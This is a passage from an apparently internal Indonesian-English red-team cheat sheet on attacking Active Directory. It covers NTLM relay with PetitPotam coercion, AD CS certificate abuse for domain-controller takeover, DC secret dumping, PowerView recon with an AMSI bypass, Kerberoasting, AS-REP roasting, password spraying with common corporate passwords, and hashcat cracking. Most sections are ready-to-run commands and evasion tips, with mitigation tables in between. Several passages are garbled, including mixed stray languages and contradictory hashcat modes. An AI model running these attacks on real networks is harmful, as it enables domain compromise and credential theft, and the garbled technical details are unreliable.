| LDAPS | `-t ldaps://dc01` | After KB4592517 **LDAPS channel binding required per-default off**. Check connection first: `openssl s_client -connect dc01:636`. relay works unless "Channel binding" enabled on DC in "Domain controller: LDAP server channel binding" — default "Never" di older functional level |
| HTTP | `-t http://web.corp.local` | WinRM/webservice/etc. |
| HTTPS/Enrollment | `--adcs --template KERBEROS_AUTHENTICATION` (ESC8) | Web Enrollment requires no channel binding |
| ADWS | `-t http://.../adws` | ADWS password reset attack ((drop) |
| MSSQL | `-t mssql://sql01` | Sysadmin role abuse |

### 4.2 Sign required / relay & signing required bypass

**Handshake NTLMrelay:**

```text
NTLM Negotiate (Type1): NegToken -> NEGOTOATE_SIGN or SEAL flag bisa set oleh client
Type2 (challenge): server men-challenge dan mengindikasikan apakah dia request signing
Type3 (auth): client menghitung MIC dan signature berdasarkan session key
```

**Klasik mitm client/server choices:**
- Client request signing (browser modern / SMB client modern) → relay fails unless we strip flags. `ntlmrelayx --remove-mic -` option downgrades? No: `--remove-mic` drops MIC, relevant for the "cross-protocol Messenger" bug (CVE-2019-1040) — ** required if relay **such** target middle (e.g. to HTTP) and client an SMB.

**Untuk relay ke LDAP-signing required in AD > `Requiring LDAP signing`** (GPO `Directory Services: LDAP client signing required`):
- Target LDAPS default without channel binding is the bypass — GPO sign tidak menuntut channel binding default.
- Channel binding enabled = endgame (raised TLS channel binds with NTLM **required** for relay connection).

**Kondisi ESC8 HTTP relay fix note:** patch 2022 menyimpan "Protect" mode — which restricts HTTP on CA.

### 4.3 ADS Relays & AD WS Relay

| Sub-surface | Contoh servant | Story |
|---|---|---|
| WSUS (HTTP 8530/8531) | `http://wsus01:8530/ClientWebService` relay SSE | WSUS Default.Upgrades metadata → attacker can push fake update if relay grants interim authentication... check |
| ADWS | port 9385, `/ADWS` powershell | Computer password reset via ADWS New-ConcurrentKey |
| Autodiscover (Exchange) | `http://exchange/autodiscover` | Mobile devices kerfuffle into System mailbox—the relay yields delegate |
| OWA | HTTP-Form (Legacy) | Not NTLM negotiate usually (Anon HTTP), need custom hybrid → No downgrade taste |

`ntlmrelayx` custom HTTP listener config:

```bash
impacket-ntlmrelayx -t http://wsus01.corp.local:8530 --http-port 8080 \
  --serve-image test.png --serve-response img
```

Notes: 8530 plain HTTP WSUS is relayable; 8531 (SSL) with client-cert updated requires TLS-Relay tricks.

## 5. Signing & mitigasi chart

| Attack | Mitigasi | Tersering terlewat |
|---|---|---|
| Coercion (all) | Disable SMB outbound via host firewall, block 445 out | workstation rarely block outbound SMB |
| SMB relay | Force signing GPO `Microsoft network server: Digitally sign communications (always)` | Servers yes, workstations default off-modern Windows 11 makes default on |
| LDAP relay | `Domain controller: LDAP server signing requirements` + `Channel binding` | legacy apps;
| Sanity: enabled signing诊所 breaks NAS or Linux sssd/samba client lacking sign support |
| ESC8 | Uninstall Web Enrollment role (`certsrv`), | web enrollment often unnecessary but incumbent |
| Shadow creds | Remove GenericWrite over users; protect `msDS-KeyCredentialLink` write via audit | rare audit rule 5136/ on property; memory-protection of the attribute is not simultaneous without blocking legit NGC writes |

Audit realistis:

```powershell
# Enroll access on template:
(Get-Acl "AD:CN=KerberosAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local").Access | ft IdentityReference, ActiveDirectoryRights
```

dGoBloodhound custom query:

```cypher
MATCH p=(:Person)-[:ENROLLEE_SUPPLIES_SUBJECT]->(:GPO) RETURN p
Match all templates whose users given enrol rights AND ENROLLEE_SUPPLIES_SUBJECT set:
MATCH (n:Base) WHERE n.objectid contains "Certificate Templates" RETURN n
```

BloodHound notes for ESC1:

```text
Enrollment rights for a template which has ENROLLEE_SUPPLIES_SUBJECT flag ON:
  - "Certificate Templates" container / ACLs imported into BloodHound-use "Certipy find" (for AD CS) + custom ingest kerberomation)
  - use certipy find -vulnerable -json
```

## 6. Blocking harden / mitigate checklist

| Attack stage | Mitigasi |
|---|---|
|Coercion | Firewalls: block 445 out from server subnet; SMB signing enforced; RPC filter (fail-safe MS-EFSRPC disable) |
| Relay ke LDAP | Enforce LDAP signing client+server; enable channel binding on LDAPS (requires 2012+ functional) |
| Relay ke HTTP | `Http strict`, require HTTPS + EE channel binding |
| ESC1-ESC8 | Template ACL hygiene; do not allow enrollee-supplied subject; `EDITF_ATTRIBUTESUBJECTALTNAME2` must equal 0; Web Enrollment uninstall; install KB esc 6, 9, 10 harden |

Check command:

```powershell
certutil -getreg policy\EditFlags
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties msPKI-Certificate-Name-Flag | ? {$_."msPKI-Certificate-Name-Flag" -band 1} | select Name
```

## 7. FAILED expedient in Remote (rarely)

| Error message | Root cause | Adjustments |
|---|---|---|
| `SMB Session Error: SESSION_ERROR Reporting.signing is mandatory` | Target enforces signing | either find another target, or force downward protocol (DNS) → leaf around signing (drop the flag). |
| `LDAP INVALID_CREDENTIALS` on target | Anti-replay (LDAP `Signing required` + channel bind) | try LDAPS instead of LDAP |
| `connection from ... is not a valid certificate request. certificate request for another user` | getren ESC context A01 | specify correct template |
| PetitPotam `EFSRPC : session_error policy error (access denied)` | unauth patched; must supply credentials | Pass credentials or use K logout over another protocol |
| PrinterBug no result (silent) | see (above) `GetPrinterDataEx` blocked behind function view | Use PetitPotam or DFSCoerce combo |
| Relay success but downstream dead-end | NTLMrelay doesn't offer post (ADS) | use `--delegate-access` for modifying attributes if provider allows |

## 8. Bekal operasional

- caching relay listening port 445 requires root; use `-socks` mode for interactive relays via proxychains (impacket's SOCKS compatible with proxychains4).

```bash
proxychains4 impacket-secretsdump -just-dc corp.local/administrator@dc01.corp.local
```

- Internet access: use a simple `socat` command to forward attention toward `ntlmrelayx`

```bash
socat TCP-LISTEN:445,fork,reuseaddr TCP:relay.server:445
```

- If target proxy denies traffic out, but allows HTTP, turn on the local socio relay connected to the trap through HTTP/SMB combos.

Untuk melihat penanda relay yang telah capture:

```bash
impacket-ntlmrelayx --list-socks
> use <sock_id>
```

## 9. Minimal Quick Wins tests

```bash
# 1. Check ADCS certipy with vulnerable flags:
certipy find -u y -p x -dc-ip 10.0.0.10 -stdout -vulnerable

# 2. Check CA config (for CA related):
certipy ca -u y -p x -ca corp-ca -read-config

# 3. Perform ESC1:
certipy req -u y -p x -ca corp-ca -template vuln -upn admin@corp.local

# 4. Authenticate:
certipy auth -pfx admin.pfx -dc-ip 10.0.0.10
```

## 10. Non-Sequitur & terjemahan praktis

Test attack:

```bash
# | Acquisition Target |
impacket-ntlmrelayx -t https://ca.corp.local -smb2support --adcs --template DomainController

python3 PetitPotam.py ca.corp.local attacker.corp.local

# refresh password
certipy auth -pfx dc.pfx -dc-ip 10.0.0.10 -ldap-shell
```

Output edge cases:

- Template `DomainController` mungkin tak memungkinkan enrollment user lain: check `certipy find`-ing for `CT_FLAG_ENROLLEE_SUPPLIES_Subject` or template CA ACA `EnrolleeSuppliesSubject`.

---

## Jebakan Operasional (yang bikin teknik gagal di lapangan)

1. **SMB signing ternyata ON di DC/workstation modern.** Default GPO di domain dengan Functional Level 2022/Windows 11 24H2 memaksa signing di banyak host — `--sam`/`-socks` ke SMB gagal diam-diam. Selalu `crackmapexec smb --gen-relay-list` dulu sebelum memilih relay target.
2. **LDAPS channel binding sudah ON tapi hanya ditemukan setelah relay gagal.** GPO "Channel binding tam" di banyak *less-hardened* domain sudah di-set "When supported" — ini cukup untuk memblok relay NTLM. Cek dengan `openssl s_client` + cek token binding TLS sebelum commit.
3. **Web Enrollment (`/certsrv`) tidak ter-install.** ESC8 butuh role *Certification Authority Web Enrollment*; banyak CA hanya punya CA role. Port 80/443 pada CA bukan bukti certsrv ada — `curl http://ca/certsrv` dulu.
4. **Template yang dipilih tidak bisa dipakai untuk relay user.** `--template DomainController` hanya sukses kalau mesin yang di-coerce adalah DC; kalau yang di-coerce adalah member server, gunakan `--template User` atau template `Machine`.
5. **Relay listener di port 445 harus dijalankan root/admin.** di Mule/contune, binding port 445 dengan user biasa gagal `Permission denied` — tapi ntlmrelayx tidak selalu error jelas.
6. **--remove-mic tidak berarti "bypass signing".** Ini hanya berguna untuk CVE-2019-1040 (drop MIC untuk cross-protocol). Kalau target server menuntut signing, remove-mic tidak menolong.
7. **Clock skew & tanggal.** Opserasi `certipy auth` butuh waktu host sink dengan DC (Kerberos error `KRB_AP_ERR_SKEW`), dan sebagian script mempunyai time window tipis pada pre-auth. Pastikan NTP (`ntpdate`) sebelum operasi.
8. **Coercion di segmen yang tidak bisa resolve nama.** PetitPotam/DFSCoerce menggunakan NetBIOS/DNS; kalau target tidak bisa resolve attacker hostname, tidak ada outbond auth yang terjadi — gunakan IP literal (beberapa vector menolak; PrinterBug menolak IP oleh design, hanya hostname).
9. **Proxy/monitoring mendeteksi.** Banyak SOC perusahaan memasang IDS menandai pola `\\ATTACKER\IPC$` string pada log EDR langsung; tuning ACL usually blocked ICunakan penggunaan file-less alternatives (misalnya, HTTP/HTTPS Fsrp emerge).
10. **Menggunakan hash vs user.** Certipy `req -hashes` opsi hanya berlaku bila user punya relevant policy; banyak times hacker commits transisi incorrect dari auth mode (pass vs cert) — always verify dengan `certipy find` / `certipy auth -debug` untuk melihat feedback error sesungguhnya.
11. **`msDS-KeyCredentialLink` di-blok Zblog`t).** Kalau target memiliki DCL protected user policy, KeyCredentialLink write tidak menolong untuk komputer tertentu. Audit LDAP write attempts: beberapa domain sudah enable audit dan melakukan notifikasi SOC otomatis.

# ad-kerb — ad

# Referensi Internal: AD Recon, Kerberos Attacks & Password Spraying

## 1. Recon & Collection — PowerView

### 1.1 Impor PowerView (PowerSploit dev atau forks)

```powershell
powershell -ep bypass
. .\PowerView.ps1
# Opsional: bypass AMSI kalau masih berjalan di PS 5.1 (Windows 10 22H2/11 24H2)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Kalau AMSI patch gagal, jalankan via PS 7.x atau join string untuk hindari static signature
```

### 1.2 Perintah mapping utama

| Tujuan | Perintah | Field output penting |
|---|---|---|
| Domain info | `Get-Domain` | `Name`, `DomainSID`, `FunctionalLevel`, `NetBIOSName` |
| DC list | `Get-DomainController` / `Get-DomainController -Domain child.local` | `Name`, `OSVersion`, `IP` |
| User aktif | `Get-DomainUser -Properties samaccountname,memberof,description -Active` | `samaccountname`, `memberof` (nested group via `Get-DomainGroup -Identity`), `description` (password leak via GPO default "description" adalah klasik) |
| SPN user | `Get-DomainUser -SPN` | `serviceprincipalname`, `samaccountname` → target kerberoast |
| AS-REP roastable | `Get-DomainUser -PreauthNotRequired` | `useraccountcontrol` flag `DONT_REQ_PREAUTH (4194304)` |
| Trust | `Get-DomainTrust` / `Get-ForestTrust` | `TrustType`, `TrustAttributes` (`WITHIN_FOREST`, `TGT_DELEGATION 0x200` = playground) |
| GPO | `Find-GPOComputerAdmin -ComputerName WS01` / `Get-DomainGPO` | `gpcfilesyspath` — cek GPP cpassword |
| ACL | `Find-InterestingDomainAcl` | `IdentitySID`, `ActiveDirectoryRights` (`GenericAll`, `WriteDacl`, `WriteOwner`, `GenericWrite` pada user = targeted kerberoast / force SPN) |
| Local admin | `Find-DomainUserLocation` / `Invoke-EnumerateLocalAdmin -TrustGroups` | user → mesin mapping (relevan untuk pivot + GPO "Restricted Groups") |
| Kerberoast target | `Get-DomainUser -SPN | Select samaccountname,memberof` | prioritas: SQL svc, backup svc, `memberof Domain Admins` |

GPP password (masih kejadian di domain old, `MS14-025` patch hanya berlaku kalau admin sudah bersih):
```bash
gpp-decrypt <cpassword>
```

## 2. BloodHound Collection

### 2.1 SharpHound (v2 runtime dari BloodHound CE)

```cmd
SharpHound.exe --CollectionMethods All --Domain corp.local --OutputDirectory C:\tmp --OutputPrefix bh1
SharpHound.exe -c Session,ComputerOnly,Group --StealSessionKey true
```

| Flag | Kenapa penting |
|---|---|
| `--CollectionMethods All` | Includes Session (needs admin reachability untuk LSS/SMB probing — lambat) |
| `Session` | mapping user→hostname, sumber for `Find-DomainUserLocation` lanjutan |
| `SessionLoop` / `Loop` | ulangi koleksi sesi (hiperparam kecil seperti `--LoopDuration 01:00:00`) |

Python version (cross-platform).
```bash
bloodhound-python -d corp.local -u 'USER' -p 'PASS' -ns 10.0.0.1 -c All
bloodhound-python -d corp.local -u USER -p PASS --hashes aad3b435b51404ee:NTLMHASH --dns-server 10.1.1.1 --dns-tcp
```
Field penting output bloodhound-python: file `*.json` per kategori (`users.json`, `computers.json`, `sessions.json`, ...) plus `*_cont.json` bila multi-domain.

### 2.2 Analisis cepat custom Cypher

```cypher
// Kerberoastable users, diurutkan per grup pengaruh
MATCH (u:User {dontreqpreauth: false}) WHERE u.hasspn=true
RETURN u.name, u.admincount, u.serviceprincipalnames

FindShortestPath manual
MATCH p=shortestPath((u:User {name:"CORP\\jdoe"})-[:MemberOf|HasSession|AdminTo|AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|_forcepspn_change|*1..]->(g:Group {name:"CORP\\DOMAIN ADMINISTRATORS@CORP.LOCAL"}))
RETURN p
```

What makes it work: BloodHound relies on LDAP queries + SMB LSARPC sessions; needs "bloodhound-node" yang readable via LDAP. Fail jika user biasa diblokir query ACL terbatas (protected `LDAP_MATCHING_RULE` di protected users), atau SMB 445 blocked di segment.

---

## 3. Kerberoast

### 3.1 Rubeus (dari mesin member)

```cmd
Rubeus.exe kerberoast /outfile:C:\tmp\hashes.txt
Rubeus.exe kerberoast /user:svc_sql /domain:corp.local /rc4opsec /nowrap
# /rc4opsec → minta RC4-HMAC saja (tidak buat 0x17 ticket AES kalau fallback), kecil, cepat dip crack
Rubeus.exe kerberoast /spn:"MSSQLSvc/sql01.corp.local" /ticket:base64...
```

Field penting output: `[*] SamAccountName`, `[*] ServicePrincipalName`, `[!] Ticket size`, hash line `krb5tgs$23$...`

**Kenapa berhasil:** TGS bisa diminta oleh **user terotentikasi apa pun** untuk SPN apa pun. TGT memakai kunci service account → offline crack. Gagal kalau: SPN di host account (krbtgt/gMSA, password 120-char, unreadable), atau AES-only + policy password kuat (`svcMgmt$xxxx`), atau RC4-HMAC disabled di domain (ruang samba/Windows dengan `msDS-SupportedEncryptionTypes = 24`).

### 3.2 GetUserSPNs.py (impacket, dari linux, remote)

```bash
# RC4 jika possible
GetUserSPNs.py -request -dc-ip 10.1.1.1 corp.local/jdoe:Password123 -outputfile hashes.txt
# Force RC4 (legacy, masih umum di domain BL disebab kan "samba compat")
GetUserSPNs.py -request -dc-ip 10.1.1.1 -hashes :NTLMHASH corp.local/jdoe -outputfile h.txt
# Targeted terhadap user judge tertentu
GetUserSPNs.py -request-user svc_backup 'corp.local/jdoe:pass'
```

Output field penting per user:
```
ServicePrincipalName  Name       MemberOf            PasswordLastSet
--------------------  -------   -----------------   ----------------
MSSQLSvc/sql01.corp   svc_sql   CN=SQLAdmins        2021-04-01
```
lalu `$krb5tgs$23$*...` hash. `$23` = RC4, `$18` = AES256 (jauh lebih berat).

### 3.3 Targeted Kerberoast (privesc via `GenericWrite`/`Write-own`)

Prasyarat: write-access ke object attribute `servicePrincipalName` (acl `GenericWrite`, `forcepspn_change`, eller owned object).

```powershell
# PowerView: assign arbitrary SPN
Set-DomainObject -Identity jvictim -SET @{serviceprincipalname='x/redteam1'}
Get-DomainUser jvictim | select serviceprincipalname
# Request TGS via Rubeus
Rubeus.exe kerberoast /user:jvictim /simple
# Bersihkan jejak
Set-DomainObject -Identity jvictim -Clear serviceprincipalname
```

Kenapa berhasil: Microsoft blockama applied SPN pada user dengan nilai duplikat di forest, tetapi `GenericWrite` cukupuntuk assign SPN → request TGS → crack. Ini melakukan NT hash user korbannya UI. Gagal bila protected user (`Attribute: adminCount=1` masih boleh!), owner changed owner, atau `sPN` blocked by `SDCURO`/Fine grained policy.

---

## 4. AS-REP Roasting

Prasyarat: user flag `UF_DONT_REQ_PREAUTH (4194304)`.

```bash
GetNPUsers.py 'corp.local/' -usersfile users.txt -no-pass -dc-ip 10.1.1.1 -format hashcat -outputfile asrep.txt
GetNPUsers.py corp.local/jdoe:password -request -format john
```

```cmd
Rubeus.exe asreproast /format:hashcat /nowrap
```

Field penting: hash line `$krb5asrep$23$user@CORP.LOCAL:...` — crack offline tanpa perlu password apapun (AS-REP reply dienkripsi dengan user key, tidak ada timestamp challenge). Gagal kalau: account disabled/expired (AS-REP error `KDC_ERR_CLIENT_REVOKED`), atau `Sensitive` setting via Fine-Grained Password Policy GPO. Set flag sendiri kalau punya `GenericWrite`:

```powershell
Set-DomainObject -Identity jvictim -XOR @{useraccountcontrol=4194304}
```

---

## 5. Password Spraying

### 5.1 sprayhound (spray + BloodHound integration)

```bash
# Basic, menyimpan daftar user dari LDAP ke lokal file
sprayhound -d corp.local -u jdoe -p 'Password123' --dc 10.1.1.1 -U users.txt
# Output format
sprayhound -d corp.local -u 'svc_ldap' -p 'Password123' -t 1 -g 3 -H hash.txt --dc 10.1.1.1
```

| Flag | Efek |
|---|---|
| `-U users.txt` | ambil valid user via LDAP anonymous/logged |
| `-t 1` / `-g 3` | lockout threshold → otomatis skip user dengan badPwdCount mendekati threshold (key fitur vs tools naive) |
| `-v` | verbose, tunjukkan `AUTH SUCCESS` + grace countdown |
| `--json` | out `valid_users.json` untuk pipeline |

Field penting output: `[*] Valid user`, `badPwdCount` — mapping "siapa mau lockout" ("smart lockout" di Windows Server 2022 Alert on threshold lockout). Spray ratio rule of thumb: satu password per-user per-policy interval ≥ `(lockout_duration)` detik, dan per batch ≤ threshold - 1.

Quickk lain:
```bash
kerbrute userenum --dc 10.1.1.1 -d corp.local users.txt    # pre-auth enum (tidak kerbalik lockout)
kerbrute passwordspray --dc 10.1.1.1 -d corp.local users.txt 'Winter2025!'
nxc smb 10.1.1.1 -d corp.local -u users.txt -p 'CorpP@ss' --continue-on-success
```

### 5.2 Timing

Keypoint: Windows lockout counter berbasis `lockoutBadCount` + `lockoutDuration` (default modern AD: 10 min observation, tetapi lihat `net accounts /domain` untuk angka konkret). Spray 1 password semua user setiap 10-15 menit aman, **kecuali** Fine-Grained Password Policy pergrup — cek `Get-DomainUser -Properties lockouttime,badpwdtime,pwdlastset` untuk identifikasi locked/ramping.

Password pola lapangan yang sering hits (indonesia corp): `Company@2025`, `Januari2025!`, `P@ssw0rd`, `Welcome123!`, seasonal + nama kota (`Jakarta2025!`).

---

## 6. Cracking (hashcat)

| Hash | Mode hashcat | Catatan |
|---|---|---|
| Kerberos TGS-RC4 | `-m 13100` | cepat di standard wordlist |
| Kerberos TGS-AES128 | `-m 19900` | 5x lebih lambat, perlu salt |
| Kerberos TGS-AES256 | `-m 19700` | kebetulan 24H2 defaultsному AES |
| Kerberos AS-REP RC4 | `-m 18200` | |
| AS-REP AES256 | `_m 19900` melain `-m 19900` adalah TGS; AS-REP AES = `-m 19900 ` tidak tepat — pakai `-m 18200` RC4 default; AES AS-REP: `-m 19900` |

Perintah:
```bash
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule --potfile-disable -O
hashcat -m 18200 asrep.txt wordlists/rockyou.txt -r rules/dive.rule
# mask, dengan whitelist 8-char:Company+year
hashcat -m 13100 hashes.txt -a3 '?u?u?u?l?l?l?d?d?d?d?s'
# Melanjutkan session
hashcat -m 13100 hashes.txt --session bh1 --restore
```

Perlu GPU untuk `-m 19900/19700`; RTX 4070 ≈ ~1500 H/s pada `13100` (RC4), <50 H/s pada `19700` (AES256) — memakai empat salt char di hash (username@domain embedded).

Untuk targeted kerberost hasil spn assignment: **use `--username` flag** karena hash embed `user@domain` (username-as-salt) — jangan potong manual tanpa flag ini.

---

## 7. Jebakan operasional (field failures)

| Jebakan | Gejala | Solusi |
|---|---|---|
| RC4 disabled | hash `$krb5tgs$18` (AES256) di output, crack praktis mustahil | Cari target lain / fokus delegated attack, atau gunakan AS-REP bila ada |
| gMSA dan managed accounts | `GetUserSPNs` no output / SPN di account `$` | skip, kw gMSA password readable via `Get-ADServiceAccount` |
| Time skew >5 min | `KRB_AP_ERR_SKEW` (Clock skew too great) | `ntpdate <dc-ip>` atau `faketime` (linux) |
| Lockout self-inflicted | badPwdCount naik ketika spraylist ACA termasuk login user non-user / device | scan dengan `kerbrute userenum` dulu (no pre-auth tally kecuali badPwdCount) — disasarkan |
| AES-hash dengan username as salt | hashcat skip semua kandidat walau password benar | verifikasi `-m 13100` atau `-m 18200` karena tool prefix mungkin beda; konversi manual `hash_name` ditambahkan |
| BloodHound CE vs legacy GUI | json dari bloodhound-python tidak dibaca CE | gunakan version matching (`--ldapPort` constraints), atau convert via `sharp collector` |
| AMSI + ETW | Rubeus mengeluarkan `Program blocked`, `amsiInitFailed` string-concat detection | base64-encoded `IEX` + string split, atau process hollowing `runas` netonly |
| Network policy filter | kerberos request via `--dc-ip` dengan non-53 dns | добавляем `--dns-server`/`-ns`; ldapnegoation sometimes need `-no-pass -k` with valid TGT in `KRB5CCNAME` |
| Domain user ber-policy FGPP | lockout threshold lebih ketat / habis | cek `msDS-LockoutObservationWindow` via `Get-DomainObject` sebelum spray |
| Unlock TAMPA lockdown | user `Get-DomainUser -Properties lockouttime` shows greater zero setelah `GetUserSPNs` | clear via `Set-DomainObject -Clear lockouttime` bila `WriteLockout` permission; else WAIT |
| Ticket cache poisoning login | `klist purge` tidak berjalan via proc saat uac token split | gunakan `Rubeus.exe purge /luid:0x...` |
| SPN assignment blocked oleh `DupSPN` | `Set-DomainObject` error `00002098` (sAMAccountName conflict) | gunakan SPN prefix unik (`nonstandard/x-lab-`) |

---

## 8. Referensi uji tooling versions

- Rubeus: fork GhostPack/Rubeus commit 2024 — flag `/nowrap` output single-line hashcat-compatible
- impacket: branch `master` (0.12+): `GetUserSPNs.py`, `GetNPUsers.py`, `ticketer.py` syntax stabil
- sprayhound: `v2.0+` (bloodhound `--json` kompatibel CE 5.x)
- PowerView: `dev` branch (PowerSploit), PS 5.1 compat, no .NET  Framework 4.8 dependency issue pada Windows 11 24H2
- Hashcat: v6.2.6+ — correct `-m 13100/18200` handling termasuk yang embed salt username
